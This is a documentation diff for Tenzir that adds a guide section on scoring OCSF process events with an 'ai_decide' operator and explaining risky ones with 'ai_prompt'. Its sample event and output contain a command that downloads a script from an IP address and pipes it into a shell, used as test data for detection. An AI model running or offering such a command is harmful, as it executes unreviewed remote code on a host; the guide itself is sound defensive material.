@@ -10,7 +10,7 @@ section: "Docs"
 
 > Add AI-generated summaries and labels to OCSF events in Tenzir pipelines
 
-This guide shows you how to enrich OCSF events with AI-generated summaries, classifications, and annotations by using [`ai_prompt`](https://tenzir.com/docs/reference/operators/ai_prompt.md).
+This guide shows you how to enrich OCSF events with AI-generated summaries, classifications, and annotations by using [`ai_prompt`](https://tenzir.com/docs/reference/operators/ai_prompt.md), and how to triage events cheaply with typed decisions from [`ai_decide`](https://tenzir.com/docs/reference/operators/ai_decide.md).
 
 The [`ai_prompt`](https://tenzir.com/docs/reference/operators/ai_prompt.md) operator sends one request per input event to an OpenAI-compatible Responses API endpoint. Use it when a deterministic rule or lookup table is too rigid, and keep the prompt payload small and explicit. The examples use compact OCSF-style records as `from {...}` starting points so you can focus on the enrichment pattern.
 
@@ -146,6 +146,99 @@ drop ai
 
 Use `concurrency` to control how many requests can run at the same time. Keep the value low until you understand your provider’s rate limits and your model latency.
 
+## Triage with typed decisions first
+
+A language model is slow and expensive to call for every event. A **decision model** answers typed questions instead: a yes/no probability, one option out of a fixed set, or a score on an ordered scale. The [`ai_decide`](https://tenzir.com/docs/reference/operators/ai_decide.md) operator asks such questions through the System One API, which hosted Jev and a local Laya server implement. Use it as a first tier that filters events, and send only the remaining events to [`ai_prompt`](https://tenzir.com/docs/reference/operators/ai_prompt.md).
+
+This example rates the command of an OCSF `process_activity` event on a three-level scale. Levels start at 0, so a score of at least 1.5 means that the model leans toward the highest level. Only risky commands reach the language model:
+
+```tql
+from {
+  time: 2024-08-22T09:15:42,
+  category_uid: 1,
+  class_uid: 1007,
+  activity_id: 1,
+  activity_name: "Launch",
+  type_uid: 100701,
+  severity_id: 1,
+  metadata: {
+    version: "1.9.0",
+  },
+  process: {
+    cmd_line: "curl -s https://203.0.113.7/x.sh | sh",
+    user: {
+      name: "build",
+    },
+  },
+  enrichments: [],
+}
+ai_decide "How risky is this command for the host?",
+          scale=["Routine administration", "Unusual but plausible",
+                 "Likely malicious or destructive"],
+          state={cmd_line: process.cmd_line, user: process.user.name},
+          model="jev-latest",
+          endpoint="https://api.typesafe.ai/v1",
+          api_key=secret("typesafe-api-key")
+where ai.decide.answer.score >= 1.5
+ai_prompt model="qwen3.8",
+          system="Explain in one sentence why this command is risky.",
+          data={cmd_line: process.cmd_line, user: process.user.name},
+          into=ai.explanation
+where ai.explanation != null
+enrichments = enrichments.add({
+  name: "process.cmd_line",
+  value: process.cmd_line,
+  type: "ai_risk",
+  provider: "Tenzir ai_decide",
+  short_desc: ai.explanation.text,
+  created_time: now(),
+  data: {
+    risk_score: ai.decide.answer.score,
+    explanation: ai.explanation.text,
+  },
+})
+drop ai
+```
+
+The decision model rates the command close to the highest level, and the language model explains why:
+
+```tql
+{
+  time: 2024-08-22T09:15:42Z,
+  category_uid: 1,
+  class_uid: 1007,
+  activity_id: 1,
+  activity_name: "Launch",
+  type_uid: 100701,
+  severity_id: 1,
+  metadata: {
+    version: "1.9.0",
+  },
+  process: {
+    cmd_line: "curl -s https://203.0.113.7/x.sh | sh",
+    user: {
+      name: "build",
+    },
+  },
+  enrichments: [
+    {
+      name: "process.cmd_line",
+      value: "curl -s https://203.0.113.7/x.sh | sh",
+      type: "ai_risk",
+      provider: "Tenzir ai_decide",
+      short_desc: "The command downloads a script from a bare IP address and pipes it straight into a shell, so it runs unreviewed remote code.",
+      created_time: 2024-08-22T09:15:44.218312Z,
+      data: {
+        risk_score: 1.99,
+        explanation: "The command downloads a script from a bare IP address and pipes it straight into a shell, so it runs unreviewed remote code.",
+      },
+    },
+  ],
+}
+```
+
+Both operators write their results below the `ai` field, and neither sends the `ai` field to the model by default. The language model therefore sees the event, not the earlier decision. Pass the decision in `data` if the explanation should take it into account.
+
 ## Use a hosted endpoint
 
 To use a hosted OpenAI-compatible endpoint, set `endpoint` and `api_key`. Both arguments are resolved as secrets, so you can keep provider details out of the pipeline text:
@@ -208,6 +301,12 @@ If a request fails, Tenzir keeps the input event and writes `null` to the tempor
 
 ```tql
 where ai.next_step != null
+```
+
+The [`ai_decide`](https://tenzir.com/docs/reference/operators/ai_decide.md) operator also writes `null` when a request fails. For triage, decide whether a failure should hide or surface an event. To fail open and keep events that the model couldn’t assess, test for `null` first:
+
+```tql
+where ai.decide == null or ai.decide.answer.score >= 1.5
 ```
 
 Model calls can send sensitive event data to another process or service. Prefer `data={...}` over sending the whole event, omit fields that aren’t needed for the task, and use secrets for endpoint URLs and API keys.
